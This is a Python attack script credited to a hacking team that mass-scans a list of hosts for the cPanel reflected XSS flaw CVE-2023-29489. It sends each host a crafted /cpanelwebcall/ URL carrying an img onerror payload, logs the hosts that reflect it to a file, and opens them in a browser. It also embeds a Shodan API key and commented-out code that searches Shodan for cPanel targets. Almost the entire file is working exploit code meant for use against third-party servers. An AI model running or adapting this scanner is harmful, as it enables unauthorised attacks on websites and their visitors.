import shodan
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import os
import platform
import pystyle
from pystyle import *
import webbrowser
import socket
#Coded By Mr.SaMi >>> 1915 Team >>> Yemeni Hackers
TM_1915 = 'tt2P5vHq83hdJTG69YK9ffdsZLboHqquDd1t'

if platform.system() == 'Windows':
        os.system(
        f'title Exploit XSS CVE-2023-29489  - By 1915 Team'
        )
not_exploit = 0
exploit = 0
error_connect = 0
#Coded By Mr.SaMi >>> 1915 Team >>> Yemeni Hackers

def logo_start():
    if platform.system() == 'Linux':
      os.system('clear')
    if platform.system() == 'Windows':
      os.system('cls')
    logo = """
                ██╗░░██╗░██████╗░██████╗  ░░███╗░░░█████╗░░░███╗░░███████╗
                ╚██╗██╔╝██╔════╝██╔════╝  ░████║░░██╔══██╗░████║░░██╔════╝
                ░╚███╔╝░╚█████╗░╚█████╗░  ██╔██║░░╚██████║██╔██║░░██████╗░
                ░██╔██╗░░╚═══██╗░╚═══██╗  ╚═╝██║░░░╚═══██║╚═╝██║░░╚════██╗
                ██╔╝╚██╗██████╔╝██████╔╝  ███████╗░█████╔╝███████╗██████╔╝
                ╚═╝░░╚═╝╚═════╝░╚═════╝░  ╚══════╝░╚════╝░╚══════╝╚═════╝░
                        By >> Mr.Sami & DeadCode & ToxicCode
                                Exploit CVE-2023-29489\r\r
	"""
    Write.Print(f"{logo.replace('░',' ')}",Colors.red,interval=0.0)
    #Coded By Mr.SaMi >>> 1915 Team >>> Yemeni Hackers




def search_cpanel_hosts(api_key):
    #Coded By Mr.SaMi >>> 1915 Team >>> Yemeni Hackers
    #api = shodan.Shodan(api_key)
    #query = 'cpanel'
    #results = api.search(query)

    #for result in results['matches']:
        #ip_str = result.get('ip_str')
        #host = result.get('http', {}).get('host')
        hosts =  Write.Input("\r\n\n╔═══[ ENTER URL LIST ]\n╚══>>>  ", Colors.red)
        print("\r")
        file_site = open(hosts,'r').read().splitlines()
        for host in file_site:
            host = host.replace("https://","").replace("http://","").replace("/","")
            if host:
                yield host

def test_xss(url):
    hacked_1915  = """/cpanelwebcall/<img%20src=x%20onerror="prompt(1915)">hacked%20by%20mr%20sami"""
    xss_url = urljoin(url, hacked_1915 )
    #Coded By Mr.SaMi >>> 1915 Team >>> Yemeni Hackers
    # Disable SSL certificate validation
    response = requests.get(xss_url, verify=False)
    
    soup = BeautifulSoup(response.text, 'html.parser')
    img_tags = soup.find_all('img', src='x')
    #Coded By Mr.SaMi >>> 1915 Team >>> Yemeni Hackers
    for img_tag in img_tags:
        if 'onerror' in img_tag.attrs and img_tag['onerror'] == "prompt(1915)":
            return True
    return False

if __name__ == '__main__':
    logo_start()
    for host in search_cpanel_hosts(TM_1915):
        for protocol in ['http', 'https']:
            url = f'{protocol}://{host}'
            #print(f'Checking: {url}')
            ip = socket.gethostbyname(host)
            try:
                #Coded By Mr.SaMi >>> 1915 Team >>> Yemeni Hackers
                if test_xss(url):
                    print(f'\033[35m[+]\033[32m Exploit XSS >>>\033[37m {url} ~ {ip}')
                    exploit +=  1
                    if platform.system() == 'Windows':
                        os.system(
                    f'title Exploit XSS - ({int(exploit)}) Not Explot - ({int(not_exploit)}) Error - ({int(error_connect)})  - By 1915 Team'
                    ) #Coded By Mr.SaMi >>> 1915 Team >>> Yemeni Hackers
                    hacked_1915  = """/cpanelwebcall/<img%20src=x%20onerror="prompt(1915)">hacked%20by%20mr%20sami"""
                    xss_1915 = open("xss_1915.txt","a")
                    xss_1915.write(f"{url}{hacked_1915}\n")
                    xss_1915.close()
                    webbrowser.open(f"{url}{hacked_1915}")
                else: #Coded By Mr.SaMi >>> 1915 Team >>> Yemeni Hackers
                    print(f'\033[35m[+]\033[31m Not Exploit >>>\033[37m {url} ~ {ip}')
                    not_exploit += 1
                    if platform.system() == 'Windows': #Coded By Mr.SaMi >>> 1915 Team >>> Yemeni Hackers
                        os.system(
                    f'title Exploit XSS - ({int(exploit)}) Not Explot - ({int(not_exploit)}) Error - ({int(error_connect)})  - By 1915 Team'
                    ) #Coded By Mr.SaMi >>> 1915 Team >>> Yemeni Hackers
            except Exception as e:
                print(f'\033[31m[!] Error Exploit >>> {url} ~ {ip} !!') #Coded By Mr.SaMi >>> 1915 Team >>> Yemeni Hackers
                error_connect += 1
                if platform.system() == 'Windows': #Coded By Mr.SaMi >>> 1915 Team >>> Yemeni Hackers
                        os.system(
                    f'title Exploit XSS - ({int(exploit)}) Not Explot - ({int(not_exploit)}) Error - ({int(error_connect)})  - By 1915 Team'
                    ) #Coded By Mr.SaMi >>> 1915 Team >>> Yemeni Hackers
